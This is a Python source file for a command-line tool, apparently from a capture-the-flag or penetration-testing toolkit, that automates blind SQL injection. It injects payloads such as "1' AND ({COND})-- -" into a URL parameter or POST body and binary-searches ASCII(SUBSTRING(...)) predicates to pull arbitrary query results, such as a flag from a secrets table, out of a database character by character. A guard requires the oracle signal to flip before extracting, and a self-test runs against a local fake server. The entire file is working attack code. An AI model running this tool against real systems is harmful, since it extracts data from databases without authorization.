#!/usr/bin/env python3
"""sqli_extract.py — binary-search extraction over a PROVEN boolean oracle.

sqli_probe says a channel exists; this is the mechanical loop after that —
for each position, binary-search a charset by injecting
AND ASCII(SUBSTRING((<sql>),pos,1)) > mid. The guard matters more than the
loop: the skill forbids hand-inferring a bit from a remembered payload, so
before extracting anything the tool fires a known-true and a known-false
predicate and REFUSES to run unless the oracle signal actually flips.
Every request is logged to the transcript — the extraction is only as real
as the recorded requests that produced it.

    python3 tools/web/sqli_extract.py --url 'http://h/i?id=1' --param id \
        --inject "1' AND ({COND})-- -" --true-regex 'item' \
        --sql "select flag from secrets" [--charset abc...] [--max-chars 64]
    python3 tools/web/sqli_extract.py --selftest
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import time
import urllib.parse

import httpkit

_MAX_REQUESTS = 4000
_DEFAULT_CHARSET = "_{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-+=:,.?/"


def _inject(args, cond: str):
    payload = args["inject"].replace("{COND}", cond)
    url, body = args["url"], args.get("body")
    if args.get("param"):
        if args.get("method", "GET") == "GET":
            q = urllib.parse.urlparse(url)
            pairs = urllib.parse.parse_qsl(q.query, keep_blank_values=True)
            pairs = [(k, payload if k == args["param"] else v) for k, v in pairs]
            if args["param"] not in [k for k, _ in pairs]:
                pairs.append((args["param"], payload))
            url = urllib.parse.urlunparse(q._replace(query=urllib.parse.urlencode(pairs)))
        else:
            enc = urllib.parse.urlencode({args["param"]: payload})
            body = enc if not body else body + "&" + enc
    elif body:
        body = body.replace("{M}", urllib.parse.quote_plus(payload))
    else:
        url = url.replace("{M}", urllib.parse.quote(payload))
    t0 = time.time()
    r = httpkit.request(url, method=args.get("method", "GET"),
                        headers=args.get("headers"), body=body,
                        timeout=args.get("timeout", 15))
    r["_elapsed"] = time.time() - t0
    return r


def _truth_value(r, oracle: dict) -> bool:
    """Decide 'predicate held' from the response, per the chosen oracle shape."""
    body = r.get("body", "")
    if isinstance(body, bytes):
        body = body.decode("utf-8", "replace")
    if oracle["mode"] == "regex":
        return bool(re.search(oracle["regex"], body))
    if oracle["mode"] == "status":
        return r.get("status") == oracle["status"]
    if oracle["mode"] == "len-eq":
        return len(body) == oracle["len"]
    if oracle["mode"] == "time":
        return r["_elapsed"] >= oracle["secs"]
    raise ValueError(oracle["mode"])


def _oracle(args) -> dict:
    if args.get("true_regex"):
        return {"mode": "regex", "regex": args["true_regex"]}
    if args.get("true_status"):
        return {"mode": "status", "status": int(args["true_status"])}
    if args.get("true_len") is not None:
        return {"mode": "len-eq", "len": int(args["true_len"])}
    if args.get("time_secs"):
        return {"mode": "time", "secs": float(args["time_secs"])}
    return {"mode": "regex", "regex": r".+"}   # degenerate: anything non-empty


def extract(args) -> dict:
    oracle = _oracle(args)
    transcript, reqs = [], [0]
    sql = args["sql"]

    def ask(cond):
        reqs[0] += 1
        if reqs[0] > _MAX_REQUESTS:
            raise RuntimeError("request budget exhausted")
        r = _inject(args, cond)
        val = _truth_value(r, oracle)
        transcript.append({"cond": cond[:90], "truth": val,
                           "status": r.get("status"), "len": len(r.get("body", b"")),
                           "elapsed": round(r.get("_elapsed", 0), 2)})
        return val

    # the gate: prove the oracle discriminates before spending a request budget
    t_held, f_held = ask("1=1"), ask("1=2")
    if t_held == f_held:
        return {"error": "oracle does not discriminate: 1=1 and 1=2 gave the same verdict",
                "verdicts": {"1=1": t_held, "1=2": f_held}, "transcript": transcript,
                "note": "do not extract on a non-discriminating oracle — re-run sqli_probe"}
    # truth semantics: 'held' = the response shape the TRUE predicate produced
    held = (lambda c: ask(c)) if t_held else (lambda c: not ask(c))

    charset = sorted(set(args.get("charset") or _DEFAULT_CHARSET))
    got, pos = [], 1
    while len(got) < args["max_chars"]:
        if not held(f"LENGTH(({sql}))>={pos}"):
            break
        c0, cN = ord(charset[0]), ord(charset[-1])
        if held(f"ASCII(SUBSTRING(({sql}),{pos},1))<{c0}") or \
           held(f"ASCII(SUBSTRING(({sql}),{pos},1))>{cN}"):
            got.append("?")
            pos += 1
            continue
        lo, hi = 0, len(charset) - 1
        while lo < hi:
            mid = (lo + hi) // 2
            if held(f"ASCII(SUBSTRING(({sql}),{pos},1))<={ord(charset[mid])}"):
                hi = mid
            else:
                lo = mid + 1
        got.append(charset[lo])
        pos += 1
    return {"extracted": "".join(got), "chars": len(got), "requests": reqs[0],
            "oracle": oracle, "transcript_tail": transcript[-10:],
            "note": "extracted via recorded requests only — attach transcript as evidence"}


def _eval_cond(expr: str, secret: str) -> bool:
    """Tiny fixture evaluator for the exact forms extract() emits."""
    if expr == "1=1":
        return True
    if expr == "1=2":
        return False
    m = re.fullmatch(r"LENGTH\(\(.+\)\)(>=|<=|>|<)(\d+)", expr)
    if m:
        n, op = int(m.group(2)), m.group(1)
        v = len(secret)
        return {">=": v >= n, "<=": v <= n, ">": v > n, "<": v < n}[op]
    m = re.fullmatch(r"ASCII\(SUBSTRING\(\(.+\),(\d+),1\)\)(>=|<=|>|<)(\d+)", expr)
    if m:
        pos, op, n = int(m.group(1)), m.group(2), int(m.group(3))
        v = ord(secret[pos - 1]) if pos <= len(secret) else 0
        return {">=": v >= n, "<=": v <= n, ">": v > n, "<": v < n}[op]
    return False


def _selftest() -> int:
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    secret = "f1g{t3st}"

    class Db(BaseHTTPRequestHandler):
        def do_GET(self):
            v = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)["id"][0]
            cond = re.search(r"AND \((.+)\)-- -", v)
            truth = _eval_cond(cond.group(1), secret) if cond else True
            body = b"item A" if truth else b""
            self.send_response(200)
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_a):
            pass

    srv = ThreadingHTTPServer(("127.0.0.1", 0), Db)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{srv.server_address[1]}/?id=1"
    args = {"url": url, "param": "id", "method": "GET", "timeout": 15,
            "inject": "1' AND ({COND})-- -", "true_regex": "item",
            "sql": "select flag from secrets", "max_chars": 16,
            "charset": "_{}f1gts3a"}
    out = extract(args)
    srv.shutdown()
    assert out.get("extracted") == secret, out.get("error") or out
    # oracle-guard path: same verdict on 1=1 and 1=2 refuses
    bad = extract(args | {"true_regex": "zzzzz-never"})
    assert "error" in bad and "discriminate" in bad["error"]
    print("sqli_extract selftest: ok")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0],
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url")
    ap.add_argument("--param")
    ap.add_argument("--inject", required=False,
                    help="payload template; {COND} is where the predicate goes")
    ap.add_argument("--sql", help="scalar SQL expression to extract")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--body", help="POST body; {M} marks the injection slot")
    ap.add_argument("--true-regex", help="body regex present when predicate holds")
    ap.add_argument("--true-status", help="status when predicate holds")
    ap.add_argument("--true-len", type=int, help="body length when predicate holds")
    ap.add_argument("--time-secs", type=float, help="held iff elapsed >= N (time oracle)")
    ap.add_argument("--charset", help="ordered charset for the binary search")
    ap.add_argument("--max-chars", type=int, default=64)
    ap.add_argument("--headers", nargs="*")
    ap.add_argument("--timeout", type=float, default=15)
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return _selftest()
    if not args.url or not args.sql or not args.inject:
        ap.print_help()
        return 2
    a = vars(args) | {"headers": httpkit.parse_headers(args.headers)}
    out = extract(a)
    httpkit.jprint(out)
    return 0 if "error" not in out else 1


if __name__ == "__main__":
    sys.exit(main())
